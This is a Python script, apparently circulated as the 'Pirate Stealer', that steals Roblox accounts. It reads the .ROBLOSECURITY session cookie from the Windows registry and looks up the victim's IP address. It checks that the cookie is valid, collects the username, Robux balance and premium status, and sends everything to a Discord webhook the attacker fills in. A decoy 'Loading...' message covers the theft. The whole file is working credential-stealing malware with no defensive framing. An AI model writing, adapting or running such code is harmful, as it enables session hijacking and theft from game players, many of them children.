""""
Please dont remove these credits
Scripter : Mani.#0001
"""

import requests
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
import robloxpy
import json

dummy_Message = "Loading..." #change this to whatever you want
print(dummy_Message)

webhook = "<webhook>" # put webhook here
################### Gathering INFOMATION #################################
def GrabCookie():
    # opening the roblox studio key
    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    # finding the subkey called ".robloxsecurity"
    try:
        count = 0
        while True:
            name, value, type = EnumValue(robloxstudiopath, count)
            if name == ".ROBLOSECURITY":
                # returns the value of .robloxsecurity
                return value
            count = count + 1
    except WindowsError:
        pass
roblox_cookie_value = str(GrabCookie())
#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    isvalid = "Valid"
else:
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']

#################### SENDING TO WEBHOOK #################
data = {
    'content' : f'***Got A Hit 💎***\n\n**Roblox Username**\n```{username}```\n**Robux Balance**\n```{robux}```\n**Premium Status**\n```{premium}```\n**IP Address**\n```{ip_address}```\n**.ROBLOSECURITY**\n```{roblox_cookie}```\n\n**Beamed Using Pirate Stealer 💸**',
    'avatar_url' : 'https://media.discordapp.net/attachments/983005828963504192/983693212491329536/Letter-P-icon_1.png',
    'username' : "BOT - Pirate 💎"
}

requests.post(webhook,data=data)
